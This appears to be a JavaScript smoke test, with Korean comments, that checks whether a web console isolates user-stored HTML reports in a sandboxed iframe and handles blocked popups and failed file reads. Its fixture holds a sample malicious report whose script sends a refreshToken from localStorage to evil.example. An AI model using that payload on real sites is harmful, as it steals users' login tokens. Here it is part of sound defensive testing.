/* 리포트 열기 격리 — 오프라인(Neo 불필요) · npm run smoke 포함
   · 파일 API는 계정 구분이 없어 남의 HTML이 섞일 수 있음 → 새 탭엔 틀만, 본문은 allow-same-origin 없는
     샌드박스 iframe(불투명 오리진)에서만 실행(콘솔 오리진의 로그인·API 토큰 접근 차단)
   · 틀에 본문(스크립트) 미포함, 팝업 차단·파일 읽기 실패 처리 */
globalThis.window = globalThis;
import { resolveObjectURL } from 'node:buffer';

const EVIL = '<!DOCTYPE html><html><body><h1>보고서</h1>'
  + '<script>fetch("https://evil.example/?t="+localStorage.getItem("refreshToken"))</script></body></html>';
let fileOk = true, fileHits = 0;
import './_faketoken.mjs';   // db.js 관문용 토큰 칸
globalThis.fetch = async (url) => {
  const u = String(url);
  if (/\/db\/files\//.test(u)) {
    fileHits++;
    if (!fileOk) return { ok: false, status: 500, blob: async () => new Blob([]) };
    return { ok: true, status: 200, blob: async () => new Blob([EVIL], { type: 'application/octet-stream' }) };
  }
  return { ok: true, status: 200, json: async () => ({ success: true, data: { rows: [] } }) };
};

const DB = (await import('../../cgi-bin/db/db.js')).default;
const { App } = await import('../src/app.js');
DB.setUser('JOY');

let fail = 0;
const chk = (ok, msg, extra) => {
  if (ok) console.log('PASS', msg, extra === undefined ? '' : extra);
  else { fail++; console.error('FAIL', msg, extra === undefined ? '' : extra); }
};
const settle = () => new Promise((r) => setTimeout(r, 30));

function fakeTab() {
  const t = { html: '', closed: false, opened: 0 };
  t.document = { open() { t.opened++; }, write(h) { t.html += h; }, close() {} };
  t.close = () => { t.closed = true; };
  return t;
}
function mkApp() {
  const app = new App({ seed: 7, equipmentCount: 3 });
  app.setState = function (st) { Object.assign(this.state, st); };
  app._toast = function (m, k) { this._lastToast = [m, k]; };
  return app;
}

// ── 정상 열기 ─────────────────────────────────────────────────────────
{
  const tab = fakeTab();
  globalThis.open = () => tab;
  const app = mkApp();
  app._openReport({ fname: 'C1_<b>x</b>.html', dir: '/JOY/vibration-reports' });
  await settle();
  const m = /<iframe sandbox="([^"]*)" src="([^"]*)"><\/iframe>/.exec(tab.html);
  chk(!!m, '새 탭에는 샌드박스 iframe 하나로 된 틀만 쓴다', tab.html.slice(0, 120));
  chk(m && m[1] === 'allow-scripts allow-modals', '샌드박스 권한은 스크립트·인쇄 대화상자뿐', m && m[1]);
  chk(m && !/allow-same-origin|allow-top-navigation|allow-popups/.test(m[1]),
    '콘솔 오리진·상위 창 이동·팝업 권한을 주지 않는다(토큰 읽기·콘솔 조작 차단)');
  chk(!/<script/i.test(tab.html) && !/evil\.example/.test(tab.html), '리포트 본문(스크립트)은 틀에 쓰이지 않는다 — iframe 안에서만 돈다');
  chk(/<title>C1_&lt;b&gt;x&lt;\/b&gt;\.html<\/title>/.test(tab.html), '탭 제목의 파일명은 이스케이프한다', (/<title>(.*?)<\/title>/.exec(tab.html) || [])[1]);
  const src = m && m[2];
  const b = src && /^blob:/.test(src) ? resolveObjectURL(src) : null;
  chk(!!b && b.type === 'text/html' && (await b.text()) === EVIL, 'iframe은 파일 내용 그대로를 HTML로 연다(차트·인쇄 기능 유지)');
}
// ── 팝업 차단 — 파일 받기 전 중단 ─────────────────────────────────
{
  globalThis.open = () => null;
  const app = mkApp();
  const h0 = fileHits;
  app._openReport({ fname: 'a.html', dir: '/JOY/vibration-reports' });
  await settle();
  chk(fileHits === h0 && /팝업이 차단/.test((app._lastToast || [])[0]), '팝업이 막히면 파일을 받지 않고 사유를 알린다');
}
// ── 파일 읽기 실패 — 빈 탭 안 남김 ──────────────────────────────
{
  fileOk = false;
  const tab = fakeTab();
  globalThis.open = () => tab;
  const app = mkApp();
  app._openReport({ fname: 'a.html', dir: '/JOY/vibration-reports' });
  await settle();
  chk(tab.closed && !tab.html && /리포트 열기 실패/.test((app._lastToast || [])[0]), '파일을 못 읽으면 열어 둔 탭을 닫고 사유를 알린다');
}

console.log(fail ? `\n${fail} failed` : '\n=== 전부 통과 ===');
process.exit(fail ? 1 : 0);
